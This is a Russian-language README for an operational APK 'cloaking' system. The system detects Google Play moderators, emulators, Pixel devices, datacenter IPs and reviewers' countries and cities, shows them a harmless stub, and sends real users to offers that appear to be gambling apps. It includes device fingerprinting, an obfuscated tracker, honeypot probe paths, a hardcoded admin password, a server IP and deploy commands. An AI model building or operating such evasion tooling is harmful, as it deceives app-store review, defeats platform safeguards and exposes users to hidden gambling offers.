# APK Traffic Filter v2.1

**Система фильтрации трафика для Android-приложений**

Полная клоака для APK: фильтрует модераторов Google Play, ботов, краулеры и прочий мусор. Реальные юзеры попадают на оффер (серый трафик), а вся нечисть летит на безопасную заглушку (белый трафик).

---

## Как это работает (общая схема)

Трафик проходит через 3 слоя, каждый отсеивает мусор:

```
Юзер открывает APK
       |
       v
[Cloudflare Worker]  <-- 1й слой: edge-фильтрация за 2-5мс
       |                  проверяет: бот? десктоп? VPN-страна? ASN датацентра?
       |
  ПРОВАЛ? --> Белая ссылка (заглушка)
       |
       v
[FastAPI Scoring Engine]  <-- 2й слой: глубокий скоринг
       |                       проверяет: заголовки, IP-аналитика, гео, провайдер
       |
  ПРОВАЛ? --> Белая ссылка
       |
       v
[JS Tracker + Play Integrity]  <-- 3й слой: поведение + устройство
       |                             проверяет: датчики, батарея, GPU, сертификат APK
       |
  ПРОВАЛ? --> Белая ссылка
       |
       v
  СЕРАЯ ССЫЛКА (оффер)  <-- только сюда попадают реальные юзеры
```

**Важно:** `белый` = заблокирован (модер/бот), `серый` = пропущен (реальный юзер). Это терминология из ТЗ, не путай.

---

## Структура проекта

```
4000_kaliningrad/
|-- server/          # FastAPI бэкенд (скоринг, API, логи)
|-- panel/           # Next.js админ-панель (управление всем)
|-- js-scripts/      # JS-трекер (собирает метрики с устройства)
|-- cf-worker/       # Cloudflare Worker (edge-фильтрация)
```

---

## Мульти-приложения

Система поддерживает несколько приложений одновременно. Каждое приложение — отдельная сущность со своими настройками.

### Как работает привязка

APK автоматически отправляет заголовок `X-Package-Name` (SDK берёт из `AndroidManifest.xml`). Сервер по этому заголовку определяет какое приложение стучится и использует его настройки:

```
APK шлёт: X-Package-Name: com.CamNangXayNha.ThietKeNhaO
                    ↓
Сервер ищет в apps.json → находит "Stake"
                    ↓
Использует Stake URLs, cert SHA-256, GCP-ключ, panic mode
```

### Что хранится для каждого приложения

| Поле | Описание |
|------|----------|
| `name` | Название (Betclic Sports, Stake, ...) |
| `package_name` | Package из AndroidManifest (com.example.app) |
| `cert_sha256` | SHA-256 сертификата подписи (base64) |
| `gcp_project_id` | ID GCP-проекта для Play Integrity |
| `safe_url` | Белая ссылка (куда слать ботов) |
| `target_url` | Серая ссылка (куда слать юзеров) |
| `white_flow_type` | Тип белого потока (redirect/403/404/html) |
| `panic_mode` | Panic mode для этого приложения |

### Как добавить новое приложение

1. **Через панель:** Приложения → Добавить → заполнить поля → Сохранить
2. **GCP-ключ:** положить `gcp-key-appN.json` в `server/config/` → перезапустить сервер
3. **В APK:** прогер указывает `serverUrl = "https://api.threeamigosteam.com/engine"` (с `/engine`!)

SDK автоматически подставит `X-Package-Name` из AndroidManifest. Сервер автоматически загрузит все GCP-ключи из `config/gcp-key*.json`.

### API приложений

| Метод | Путь | Описание |
|-------|------|----------|
| `GET` | `/api/apps` | Список всех приложений |
| `POST` | `/api/apps` | Добавить приложение |
| `PUT` | `/api/apps/{id}` | Обновить приложение |
| `DELETE` | `/api/apps/{id}` | Удалить приложение |
| `PUT` | `/api/apps/{id}/panic` | Вкл/выкл panic mode |

### Мульти-GCP ключи

Каждое приложение может иметь свой GCP-проект для Play Integrity:

```
server/config/
  gcp-key.json          → betclic-497407     (Betclic Sports)
  gcp-key-app2.json     → stake-497708       (Stake)
  gcp-key-app3.json     → total-casino-497709 (Total Casino)
```

Сервер при старте автоматически загружает ВСЕ `gcp-key*.json` файлы. Приложение привязывается к ключу через `gcp_project_id` в настройках.

### SHA-256 сертификата

Play Console → Целостность → Сертификат ключа подписи → SHA-256. Формат HEX с двоеточиями, нужно перевести в base64:

```bash
echo "E9:D0:ED:C5:1A:7F:..." | tr -d ':' | xxd -r -p | base64
```

**Важно:** если включён Google Play App Signing — нужен SHA-256 от **ключа подписи Google** (не upload key). Это тот сертификат который будет у юзеров из Play Store.

---

## 6 блоков фильтрации

Система проверяет трафик по 6 блокам. Каждый блок может заблокировать запрос. Только если ВСЕ блоки пройдены — юзер попадает на оффер.

### Блок 1: Статические заголовки

Самая первая проверка. APK отправляет заголовки вместе с запросом, мы их читаем и палим подставу.

| Проверка | Что палим | Баллы |
|----------|-----------|-------|
| `X-Client-Secret` | Нет секретного заголовка = запрос не из нашего APK | 100 (бан) |
| `User-Agent` | Googlebot, AdsBot, bingbot и прочие краулеры | 100 (бан) |
| `X-Device-Model` | Pixel 4/5/6/7/8 — устройства модерации Google | 40 |
| `X-Device-Codename` | goldfish, ranchu, vbox86p — кодовые имена эмуляторов | 100 (бан) |
| `X-GPU-Renderer` | SwiftShader, VirtualBox, Android Emulator — GPU эмуляторов | 100 (бан) |
| `X-Build-Product` | sdk_phone_x86, Generic_Android — тестовые сборки | 100 (бан) |

**Где настроить:** стоп-листы лежат в `server/lists/` — просто добавляй строки в txt-файлы. Сервер подхватит изменения автоматически (hot-reload каждые 5 сек).

### Блок 2: IP-аналитика

Проверяем IP адрес через внешние сервисы и свои списки.

| Проверка | Что палим | Баллы |
|----------|-----------|-------|
| ASN | 16 датацентровых ASN (Google, Amazon, Microsoft, Cloudflare, DO, Hetzner...) | 100 (бан) |
| IP CIDR | 317 диапазонов IP ботов и датацентров | 100 (бан) |
| Страна | US, GB, DE, FR, NL, SE, CA, AU, JP, SG, IN | 100 (бан) |
| Город | 60 городов модерации (Mountain View, Cupertino, Dublin, Hyderabad...) | 15 |
| ISP | 33 провайдера (Google LLC, Amazon, Microsoft Azure, Hetzner...) | 20 |
| IPinfo: VPN | VPN обнаружен | 25 |
| IPinfo: Proxy | Прокси обнаружен | 25 |
| IPinfo: Tor | Tor обнаружен | 25 |
| IPinfo: Hosting | IP принадлежит хостингу | 20 |
| IPQS: Fraud Score | Fraud score > 75 | 50 |
| IPQS: Bot | Определён как бот | 100 (бан) |

**Где настроить:**
- Списки стран/городов/ISP: `server/lists/*.txt`
- IP-диапазоны: `server/lists/ip_ranges_block.txt` (CIDR формат, типа `35.192.0.0/12`)
- Токены API: `server/.env` → `IPINFO_TOKEN`, `IPQS_API_KEY`

### Блок 3: Play Integrity API

Проверяем через Google что устройство настоящее и APK не модифицирован.

| Проверка | Что палим | Баллы |
|----------|-----------|-------|
| Device Integrity | Пустой вердикт или только VIRTUAL | 100 (бан) |
| App Recognition | Не PLAY_RECOGNIZED = APK модифицирован или репак | 100 (бан) |
| Certificate SHA-256 | Хеш сертификата не совпадает = APK переподписан | 100 (бан) |
| App Licensing | Не LICENSED | 30 |
| Nonce replay | Nonce уже использован или истёк (5 мин TTL) | 100 (бан) |
| Nonce-IP mismatch | Nonce выдан на другой IP = токен украден | 100 (бан) |

**Как работает:**
1. APK запрашивает nonce: `GET /api/integrity/nonce` → получает одноразовый токен
2. APK вызывает Play Integrity API Google с этим nonce
3. APK отправляет integrity token на сервер: `POST /api/integrity/verify`
4. Сервер декодирует токен через GCP и проверяет всё

**Где настроить:**
- GCP ключ: `server/config/gcp-key.json`
- Package name: `server/.env` → `PACKAGE_NAME=com.mazourbn.jaberbagh`
- SHA-256 сертификата: `server/.env` → `CERT_SHA256=5QabPPipWBDaB1A2ZBvB+m318YgjjIEoAbZ4XToKJUs=`

### Блок 4: Поведенческие данные (JS-датчики)

JS-трекер собирает данные о поведении юзера на странице и отправляет на сервер. Мягкие проверки — баллы накапливаются, бан при сумме >= 50.

| Проверка | Что палим | Баллы |
|----------|-----------|-------|
| Акселерометр | Deviation < 0.08 = устройство лежит неподвижно (эмулятор) | 30 |
| Мышь без тача | Есть клики мыши, нет тач-событий = десктоп/эмулятор | 30 |
| Фейковая батарея | Уровень 100% + chargingTime=0 = паттерн эмулятора | 50 (бан) |
| Таймзона | Таймзона JS не совпадает с таймзоной IP | 15 |
| Скорость действий | > 10 actions/sec = автоматизация/бот | 40 |
| Touch не поддерживается | Устройство не умеет в тач | 20 |
| Язык vs страна | Язык устройства не типичен для страны IP | 10 |
| Много языков | 3+ языков на устройстве = паттерн модератора | 15 |

**Порог:** если сумма мягких баллов >= 50 → белая ссылка.

### Блок 5: Отпечаток устройства

Тоже собирается JS-трекером вместе с блоком 4.

| Данные | Зачем |
|--------|-------|
| WebGL GPU | Палим эмулятор по рендереру (SwiftShader, llvmpipe) |
| Canvas fingerprint | Уникальный хеш рендеринга — у эмуляторов одинаковый |
| Экран | Разрешение, pixelRatio, colorDepth |
| Hardware | Кол-во ядер CPU, память, платформа |
| Языки | navigator.language + navigator.languages |

### Блок 6: Honeypot-ловушки

Ловим ботов на приманки. 3 типа ловушек:

**1. Trap-пути (42 штуки):** Реальный юзер никогда не полезет на `/wp-admin`, `/.env` или `/phpmyadmin`. Бот — полезет. При заходе на ловушку IP банится автоматически.

Примеры trap-путей:
```
/wp-admin, /wp-login.php, /admin, /login, /phpmyadmin
/.env, /.env.local, /config.php, /.git/config
/robots.txt, /sitemap.xml, /xmlrpc.php
/debug, /server-status, /shell, /cmd
/api/v1, /api/v2, /backup, /dump.sql
```

**2. Honeyfield (скрытые поля в формах):** На белой странице (заглушке) есть форма с невидимыми полями. Человек их не видит и не заполняет. Бот — заполняет. Попался → бан.

**3. Трёхслойный авто-бан:** Когда IP попадается на ловушке, он банится сразу в 3 местах:
- Redis (мгновенная проверка, TTL 1 год)
- PostgreSQL (постоянное хранение)
- Cloudflare Access Rules (бан на уровне CDN, трафик даже не дойдёт до сервера)

---

## Админ-панель

Красивая панель для управления всей системой. Тёмная тема, современный UI.

**Доступ:** `https://threeamigosteam.com`

**Логин:**
```
Email:    admin@panel.local
Пароль:   admin123
```

### Вкладки панели

#### 1. Дашборд (главная)

Основная статистика за последние 24 часа:
- **Всего запросов** — общее количество
- **Серый трафик** — сколько юзеров прошли фильтр (проценты + число)
- **Белый трафик** — сколько отсеяно (проценты + число)
- **Активные баны** — сколько IP в бане
- **Текущий RPS** — запросов в секунду

**Графики:**
- График трафика по часам (серый vs белый)
- Причины блокировок (какие проверки срабатывают чаще всего)

**Лента запросов:** Таблица с последними запросами в реалтайме. Кликай на любой — откроется модалка с подробностями:
- **Заголовки** — все HTTP-заголовки запроса
- **JS метрики** — данные с трекера (батарея, акселерометр, GPU, язык...) с цветовыми индикаторами (зелёный = ОК, красный = подозрение)
- **Play Integrity** — результат проверки устройства (BASIC/DEVICE/STRONG, лицензия, сертификат)
- **Raw JSON** — полный дамп данных

#### 2. Безопасность (стоп-листы)

Управление всеми 8 блок-листами:

| Список | Что в нём | Сколько записей |
|--------|-----------|-----------------|
| Блокировка стран | Коды стран (US, GB, DE...) | 11 |
| Города модерации | Города офисов Google/Apple | 60 |
| Стоп-лист ботов | User-Agent подстроки | 10 |
| Модели устройств | Pixel 4, 5, 6, 7, 8... | 9 |
| Кодовые имена эмуляторов | goldfish, ranchu, vbox86p... | 9 |
| GPU эмуляторов | SwiftShader, VirtualBox... | 8 |
| Build тестовых устройств | sdk_phone_x86, Generic_Android... | 32 |
| Провайдеры | Google LLC, Amazon, Hetzner... | 33 |

Каждый список можно редактировать прямо в панели — добавлять/удалять строки и сохранять. Изменения подхватываются автоматически (hot-reload).

#### 3. Активность (аудит-лог)

Полный журнал всех запросов с фильтрами:
- **Поиск** по IP, устройству, User-Agent
- **Фильтр по вердикту** — серый / белый / все
- **Фильтр по причине блокировки** — выбирай из списка (VPN, бот, эмулятор...)
- **Фильтр по стране**
- **Диапазон дат**
- **Пагинация** — 10/25/50/100 записей на страницу

Кликай на запись — та же подробная модалка что на дашборде.

#### 4. Пользователи (баны)

Две секции:

**Бан-лист:**
- Список всех забаненных IP
- Причина бана (honeypot, ручной, автоскоринг)
- Источник (Honeypot / Ручной / Cloudflare)
- Дата бана
- Кнопка разбана — удаляет из Redis + PostgreSQL + Cloudflare

**Белый список (исключения):**
- IP-адреса которые никогда не блокируются
- Метка (Разработчик, Тестер, CI/CD...)
- Device ID привязка

#### 5. Приложения (офферы)

Настройки куда перенаправлять трафик:

- **Safe URL** — куда отправляем ботов/модеров (по дефолту: страница в Google Play)
- **Target URL** — куда отправляем реальных юзеров (оффер)
- **White Flow Type** — что показывать заблокированным:
  - `redirect_safe` — редирект на Safe URL
  - `show_403` — показать 403 Forbidden
  - `show_404` — показать 404 Not Found
  - `fake_html` — показать фейковую страницу с honeypot-формой

#### 6. Настройки (конфиг скоринга)

Тонкая настройка скоринг-движка:

**Основные параметры:**
- `scoreThreshold` — порог скоринга (по дефолту 1 на gateway, т.е. любой признак = бан)
- `minPlayIntegrity` — минимальный уровень PI (BASIC / DEVICE / STRONG)
- `clickSpeedLimit` — лимит кликов/сек для детекта ботов
- `timezoneDriftHours` — допустимая разница таймзон

**Веса проверок (ползунки):**
- VPN/Proxy/Tor — сколько баллов за VPN (дефолт: 25)
- Подозрительный город — баллы за город модерации (дефолт: 15)
- Подозрительный хостинг — баллы за ISP (дефолт: 20)
- Мышь без тача — баллы за десктоп-паттерн (дефолт: 30)
- Несовпадение таймзоны — баллы за timezone mismatch (дефолт: 15)

### Mock-режим

В сайдбаре внизу есть тумблер **"Mock-данные"**. Когда включён — панель показывает сгенерированные тестовые данные без обращения к серверу. Удобно для демо и проверки UI.

Состояние сохраняется в localStorage — не сбрасывается при перезагрузке.

---

## Cloudflare Worker (Edge-фильтр)

Первая линия обороны. Работает на серверах Cloudflare по всему миру, фильтрует до того как трафик дойдёт до нашего сервера. Латенси 2-5мс.

**Что проверяет (по порядку):**

1. **Panic Mode** — если включён, весь трафик идёт на белую ссылку. Аварийный рубильник.
2. **Honeypot-пути** — `/wp-admin`, `/.env`, `/admin` и т.д. → бан
3. **X-Client-Secret** — APK должен слать секретный заголовок. Нет заголовка = не наш APK → бан
4. **Bot User-Agent** — Googlebot, AdsBot и т.д. → бан
5. **Desktop User-Agent** — Windows NT, Macintosh, X11 → бан (нам нужен только Android)
6. **Нет "Android" в UA** → бан
7. **Страна** — US, GB, DE и т.д. → бан (берёт из CF-заголовков, без API)
8. **ASN** — датацентровые ASN → бан

Если всё ОК — проксирует запрос на FastAPI с добавленными заголовками:
```
X-Forwarded-For:  реальный IP юзера
X-Real-IP:        реальный IP юзера
X-CF-Country:     код страны (от Cloudflare)
X-CF-ASN:         номер ASN (от Cloudflare)
X-CF-Ray:         ID запроса
X-Filter-Time:    время фильтрации в мс
```

**Настройки через Cloudflare KV:**
Конфиг ворекра хранится в KV-хранилище и синхронизируется из панели (кнопка "Синхронизировать в CF"). Можно менять списки без передеплоя воркера.

---

## JS-трекер (tracker.js)

Скрипт который встраивается в страницу оффера и собирает данные об устройстве юзера.

### Что собирает

| Метрика | Описание | Зачем |
|---------|----------|-------|
| Экран | Разрешение, pixelRatio, глубина цвета | Профиль устройства |
| Батарея | Уровень, зарядка, chargingTime | Фейковая батарея = эмулятор |
| Акселерометр | Отклонение от 9.81 м/с² | Статичное устройство = эмулятор |
| Мышь/Тач | Клики мыши, тач-события | Мышь без тача = десктоп |
| Скорость действий | Максимум действий в секунду | > 10/сек = бот-автоматизация |
| WebGL | Вендор и рендерер GPU | SwiftShader = эмулятор |
| Canvas FP | Хеш рендеринга на canvas | Уникальный отпечаток |
| Hardware | CPU cores, RAM, платформа | Профиль устройства |
| Язык | navigator.language + languages | Не совпадает со страной? |
| Таймзона | Intl timezone | Не совпадает с IP? |
| Honeyfield | Заполнены скрытые поля? | Бот не видит что поле скрыто |

### Как подключить в APK

```html
<script>
  window.__TRACKER_URL = "https://api.threeamigosteam.com/engine";
</script>
<script src="https://api.threeamigosteam.com/engine/tracker.js"></script>
```

Или используй обфусцированную версию `tracker.min.js` (93 КБ, RC4 шифрование строк, control flow flattening).

### Как пересобрать после изменений

```bash
cd js-scripts/
npm run build    # генерит tracker.min.js из tracker.js
```

---

## API-эндпоинты (для APK-разработчика)

### Основной флоу APK

```
1. APK -> GET /                          # Gateway: проверка заголовков + IP
           Headers: X-Client-Secret, X-Package-Name, X-Device-Model,
                    X-Device-Codename, X-GPU-Renderer, X-Build-Product, User-Agent
   
   Ответ: 302 redirect на targetUrl (серый) или safeUrl (белый)
   Сервер определяет приложение по X-Package-Name → использует его URLs

2. APK -> GET /api/integrity/nonce       # Получить одноразовый nonce
   Ответ: { "nonce": "abc123...", "ttl": 300 }

3. APK -> вызывает Google Play Integrity API с nonce

4. APK -> POST /api/integrity/verify     # Отправить integrity token
           Headers: X-Package-Name
           Body: { "integrityToken": "...", "nonce": "abc123..." }
   Ответ: { "verified": true, "verdict": "grey", "score": 0, ... }

5. Страница оффера загружает tracker.js  # Автоматически собирает метрики
   
6. tracker.js -> POST /api/collect       # Отправка метрик (автоматически через 3 сек)
   Ответ: { "received": true, "verdict": "grey", "score": 0, ... }
```

### Все эндпоинты

| Метод | Путь | Описание |
|-------|------|----------|
| `GET` | `/` | Gateway — основная точка входа |
| `GET` | `/score-debug` | Дебаг-скоринг (показывает баллы без редиректа) |
| `GET` | `/api/health` | Здоровье сервера |
| `GET` | `/api/integrity/nonce` | Получить nonce для Play Integrity |
| `POST` | `/api/integrity/verify` | Верифицировать integrity token |
| `GET` | `/api/integrity/status` | Статус Play Integrity API |
| `POST` | `/api/collect` | Принять JS-метрики |
| `GET` | `/api/config` | Получить конфиг скоринга |
| `PUT` | `/api/config` | Обновить конфиг |
| `GET` | `/api/offers` | Получить настройки офферов |
| `PUT` | `/api/offers` | Обновить офферы |
| `GET` | `/api/lists` | Все стоп-листы |
| `GET` | `/api/lists/{id}` | Конкретный стоп-лист |
| `GET` | `/api/dashboard/metrics` | Метрики для дашборда |
| `GET` | `/api/dashboard/feed` | Лента запросов |
| `GET` | `/api/dashboard/rejections` | Статистика блокировок |
| `GET` | `/api/audit/logs` | Аудит-лог с фильтрами |
| `GET` | `/api/bans/honeypot` | Список забаненных IP |
| `DELETE` | `/api/bans/honeypot/{ip}` | Разбанить IP |
| `GET` | `/api/apps` | Список всех приложений |
| `POST` | `/api/apps` | Добавить приложение |
| `PUT` | `/api/apps/{id}` | Обновить приложение |
| `DELETE` | `/api/apps/{id}` | Удалить приложение |
| `PUT` | `/api/apps/{id}/panic` | Вкл/выкл panic mode для приложения |
| `GET` | `/api/dashboard/traffic` | Трафик по часам (24ч) |
| `PUT` | `/api/cf/sync` | Синхронизировать конфиг в Cloudflare KV |
| `PUT` | `/api/cf/panic` | Включить/выключить panic mode (глобальный) |

---

## Деплой и инфраструктура

### Что крутится на сервере

```
Сервер: 31.76.251.103 (Ubuntu 24.04)
Домен: threeamigosteam.com (через Cloudflare)

Сервисы:
  - FastAPI (scoring engine) -> порт 8000 (systemd: scoring-engine)
  - Next.js (админ-панель)   -> порт 3000
  - PostgreSQL               -> порт 5432
  - Redis                    -> порт 6379
  - Nginx (reverse proxy)    -> порт 80/443
```

### Nginx маршрутизация

```
https://threeamigosteam.com/          -> Next.js панель (порт 3000)
https://threeamigosteam.com/engine/   -> FastAPI скоринг (порт 8000)
```

### Перезапуск сервисов

```bash
# Скоринг-движок
systemctl restart scoring-engine

# Проверить статус
systemctl status scoring-engine

# Логи
journalctl -u scoring-engine -f

# Панель
cd /root/panel && npm run build && pm2 restart panel
```

### Файлы на сервере

```
/opt/scoring-engine/          # FastAPI бэкенд
  |-- main.py
  |-- scoring_engine.py
  |-- api/
  |-- lists/                  # Стоп-листы (можно редактировать прямо на серв)
  |-- config/
  |     |-- gcp-key.json      # GCP ключ для Play Integrity
  |-- .env                    # Переменные окружения

/root/panel/                  # Next.js панель
/root/js-scripts/             # JS-трекер (tracker.js + tracker.min.js)
```

---

## Переменные окружения

### Server (.env)

```bash
# === IP-аналитика ===
IPINFO_TOKEN=твой_токен           # Токен с ipinfo.io (бесплатный план норм)
IPQS_API_KEY=                     # Токен IPQS (опционально, для доп. проверок)

# === База данных ===
DATABASE_URL=postgresql+asyncpg://panel:panel@localhost:5432/panel
REDIS_URL=redis://localhost:6379/0

# === Rate Limiting ===
RATE_LIMIT=100                    # Макс запросов с одного IP
RATE_WINDOW=60                    # За сколько секунд (100 req/60 sec)

# === Cloudflare ===
CF_API_TOKEN=                     # API-токен CF (нужен Firewall:Edit)
CF_ACCOUNT_ID=                    # ID аккаунта CF
CF_KV_NAMESPACE_ID=               # ID KV-namespace
CF_ZONE_ID=                       # ID зоны домена
CF_CLIENT_SECRET=                 # Секрет для X-Client-Secret заголовка

# === Play Integrity ===
GCP_KEY_PATH=config/gcp-key.json  # Путь к GCP service account key
PACKAGE_NAME=com.mazourbn.jaberbagh  # Package name APK
NONCE_TTL=300                     # Время жизни nonce в секундах
CERT_SHA256=5QabPPipWBDaB1A2ZBvB+m318YgjjIEoAbZ4XToKJUs=  # SHA-256 сертификата подписи
```

### Panel (.env)

```bash
DATABASE_URL="file:./dev.db"      # SQLite для панели
AUTH_SECRET="сгенерируй-через-openssl-rand-hex-32"
AUTH_TRUST_HOST=true               # Нужно для IP-based хостов
NEXT_PUBLIC_API_URL=https://api.threeamigosteam.com/engine
```

---

## Все коды блокировок

Когда запрос блокируется, ему присваивается код причины. Вот полный список:

| Код | Описание |
|-----|----------|
| `no_client_secret` | Нет заголовка X-Client-Secret |
| `bot_user_agent` | User-Agent из стоп-листа ботов |
| `device_blocked` | Модель устройства заблокирована (Pixel и т.д.) |
| `emulator_detected` | Кодовое имя эмулятора |
| `emulator_gpu` | GPU эмулятора |
| `test_build_detected` | Тестовая сборка (sdk_phone, Emulator...) |
| `country_blocked` | Страна в стоп-листе |
| `city_blocked` | Город модерации |
| `asn_blocked` | ASN датацентра |
| `ip_range_blocked` | IP в CIDR-диапазоне ботов |
| `suspicious_hosting` | ISP/хостинг провайдер |
| `vpn_detected` | VPN обнаружен |
| `proxy_detected` | Proxy обнаружен |
| `tor_detected` | Tor обнаружен |
| `ipqs_high_fraud` | IPQS fraud score > 75 |
| `bot_detected` | IPQS определил как бот |
| `honeypot` | IP зашёл на ловушку |
| `integrity_invalid` | Play Integrity: nonce невалиден |
| `device_compromised` | Play Integrity: устройство не прошло |
| `app_tampered` | Play Integrity: APK модифицирован |
| `cert_mismatch` | Play Integrity: APK переподписан другим ключом |
| `behavioral_score` | Совокупность мягких JS-проверок >= 50 |
| `panic_mode` | Panic mode включён (весь трафик на белую) |

---

## Стоп-листы

### Как редактировать

**Вариант 1: Через панель**
Вкладка "Безопасность" → выбрать список → редактировать → сохранить

**Вариант 2: Прямо на сервере**
```bash
nano /opt/scoring-engine/lists/cities_block.txt
# Добавить город, по одному на строку
# Сервер подхватит через 5 сек (hot-reload)
```

### Полный состав списков

**countries_block.txt** (11 стран):
```
US, GB, DE, FR, NL, SE, CA, AU, JP, SG, IN
```

**cities_block.txt** (60 городов):
```
Mountain View, Cupertino, Sunnyvale, Santa Clara, Palo Alto, San Francisco,
San Jose, Los Angeles, New York, Seattle, Redmond, Dublin, London, Vienna,
Tel Aviv, Bangalore, Hyderabad, Singapore, Tokyo, Seoul, Beijing, Sydney...
```

**ip_ranges_block.txt** (317 CIDR-диапазонов):
Диапазоны Google, Facebook, Microsoft, Amazon и других датацентров.

---

## Panic Mode (аварийный режим)

Если всё пошло по бороде и надо срочно закрыть весь трафик:

```bash
# Включить через API
curl -X PUT "https://api.threeamigosteam.com/engine/api/cf/panic?enabled=true"

# Или через Cloudflare KV
# Установить ключ PANIC_MODE = "true"
```

Весь трафик мгновенно начнёт лететь на белую ссылку. Выключить обратно:

```bash
curl -X PUT "https://api.threeamigosteam.com/engine/api/cf/panic?enabled=false"
```

---

## Частые вопросы

### Как добавить новую страну в блок?
Открой `server/lists/countries_block.txt`, добавь код страны (ISO 2-буквенный, типа `TR`) на новую строку. Или через панель: Безопасность → Блокировка стран → добавить → сохранить.

### Как поменять оффер-ссылку?
Панель → Приложения → поле "Target URL" → вставь новую ссылку → Сохранить. Или через API:
```bash
curl -X PUT https://api.threeamigosteam.com/engine/api/offers \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"https://новая-ссылка.com","safeUrl":"https://play.google.com","whiteFlowType":"redirect_safe"}'
```

### Как разбанить IP?
Панель → Пользователи → найти IP → кнопка "Разбанить". Или через API:
```bash
curl -X DELETE https://api.threeamigosteam.com/engine/api/bans/honeypot/1.2.3.4
```

### Как посмотреть почему конкретный IP заблокирован?
Используй score-debug:
```bash
curl https://api.threeamigosteam.com/engine/score-debug \
  -H "X-Client-Secret: твой_секрет" \
  -H "X-Forwarded-For: 1.2.3.4" \
  -H "User-Agent: Mozilla/5.0"
```
Вернёт JSON со всеми проверками и баллами.

### Как обновить GCP-ключ или сертификат подписи?
1. Положи новый ключ в `/opt/scoring-engine/config/gcp-key.json`
2. Обнови SHA-256 в `.env`: `CERT_SHA256=новый_хеш`
3. Перезапусти: `systemctl restart scoring-engine`

### Как задеплоить изменения в Cloudflare Worker?
```bash
cd cf-worker/
npx wrangler deploy
```

---

## Техстек

| Компонент | Технология |
|-----------|------------|
| Backend | Python 3.12, FastAPI, SQLAlchemy async, Pydantic v2 |
| Frontend | Next.js 16, React 19, TypeScript, Tailwind CSS v4, shadcn/ui |
| Database | PostgreSQL (бэкенд), SQLite (панель) |
| Cache/Queue | Redis (rate limiting, nonce, бан-лист) |
| Edge | Cloudflare Workers + KV Storage |
| IP Geo | IPinfo.io API |
| Fraud | IPQS API (опционально) |
| Integrity | Google Play Integrity API (GCP) |
| Obfuscation | javascript-obfuscator (RC4, control flow) |
| Auth | NextAuth.js v5 (JWT + bcrypt) |
| Proxy | Nginx (reverse proxy, SSL via Let's Encrypt) |
| SSL | Let's Encrypt (certbot) через Cloudflare Full mode |

---

*v2.1.0 | Developed by maks*
